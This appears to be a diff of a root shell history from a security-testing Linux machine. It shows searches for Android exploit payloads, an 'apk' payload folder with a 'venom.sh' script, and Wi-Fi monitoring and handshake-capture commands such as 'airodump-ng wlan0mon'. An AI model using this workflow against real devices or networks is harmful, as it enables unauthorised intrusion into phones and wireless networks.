+ 1901  ls
+ 1902  clear
+ 1903  sh venom.sh 
+ 1904  findsploit payload | grep androi
+ 1905  findsploit payload | grep android
+ 1906  findsploit payload android
+ 1907  findsploit --h
+ 1908  cd /home
+ 1909  dir
+ 1910  ls
+ 1911  ls -n
+ 1912  mkdir payloads
+ 1913  cd python/
+ 1914  ls
+ 1915  cd ..
+ 1916  cd payloads/
+ 1917  lsl
+ 1918  ls
+ 1919  mkdir apk
+ 1920  ln -s /home/payloads/apk /root/
+ 1921  cd 
+ 1922  cd apk/
+ 1923  dir
+ 1924  touch venom.sh
+ 1925  ls -n
+ 1926  chmod +x venom.sh 
+ 1927  ls -n
+ 1928  nano venom.sh 
+ 1929  rm AndroidHack.txt 
+ 1930  lss
+ 1931  lsl
+ 1932  ls
+ 1933  sh venom.sh 
+ 1934  nano venom.sh 
+ 1935  dir apk
+ 1936  rm apk/AndroidHack.txt 
+ 1937  eix
+ 1938  exit
+ 1939  sh apk/venom.sh 
+ 1940  dir apk
+ 1941  airmon-ng stop wlan0mon
+ 1942  ifconfig
+ 1943  exit
+ 1944  wificapture
+ 1945  wificap
+ 1946  hotspot
+ 1947  nm-connection-editor
+ 1948  cd script
+ 1949  ls
+ 1950  ls -n
+ 1951  touch hotspot.sh
+ 1952  figlet hotspot.sh 
+ 1953  figlet "starting hotspot"
+ 1954  figlet "starting  hotspot"
+ 1955  figlet "hotspot"
+ 1956  figlet "hotspot : ON"
+ 1957  nano hotspot.sh"
+ 1958  nano hotspot.sh
+ 1959  chmod +x hotspot.sh 
+ 1960  sh hotspot.sh 
+ 1961  nano /root/.bashrc
+ 1962  hotspot
+ 1963  nano /root/.bashrc
+ 1964  ls -n
+ 1965  ls -n /home/script/txt/allCommand /root/
+ 1966  ls -n /home/script/txt/apt /root/
+ 1967  ln -s /home/script/txt/bash /root/
+ 1968  touch bash/bash02
+ 1969  nano bash/bash02
+ 1970  cat cmd
+ 1971  cd /home/script/txt/
+ 1972  ls -n
+ 1973  cat cmd
+ 1974  ln -s /home/script/txt/cmd /root/
+ 1975  cd 
+ 1976  ls -n
+ 1977  cd /home/script/txt/
+ 1978  ls
+ 1979  ls -n
+ 1980  cat alias-help 
+ 1981  cat bash 
+ 1982  mkdir bash
+ 1983  ls -n
+ 1984  cd bash
+ 1985  mv bash bash01
+ 1986  mkdir bash
+ 1987  mv bash01 bash
+ 1988  cd bash/
+ 1989  ls
+ 1990  nano /root/.bashrc
+ 1991  ls -n
+ 1992  airodump wla0mon
+ 1993  airodump-ng wlan0mon
+ 1994  cat cmd
+ 1995  wifihshake
+ 1996  dir history
+ 1997  history history/nm-connection-editor-history
+ 1998  history > history/nm-connection-editor-history
